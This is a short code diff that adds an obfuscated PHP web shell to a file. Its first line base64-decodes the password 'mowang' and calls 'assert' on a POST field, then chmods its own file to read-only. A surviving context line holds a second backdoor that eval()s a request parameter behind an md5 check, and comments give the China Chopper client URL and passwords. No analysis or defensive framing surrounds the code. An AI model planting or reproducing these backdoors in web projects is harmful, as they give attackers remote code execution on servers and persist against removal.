@@ -1,3 +1,8 @@
+<?php $p=base64_decode("bW93YW5n");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);function set_writeable($file_name){if(@chmod($file_name,0444)){echo "OK";}else{echo "no";}}set_writeable($filename);?>
+//密码mowang
+
+/*--------------------------------------------------------------------------------*/ 
+
 <?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>
 //菜刀提交  http://192.168.1.5/x.php?x=lostwolf  脚本类型:php  密码为 c
 
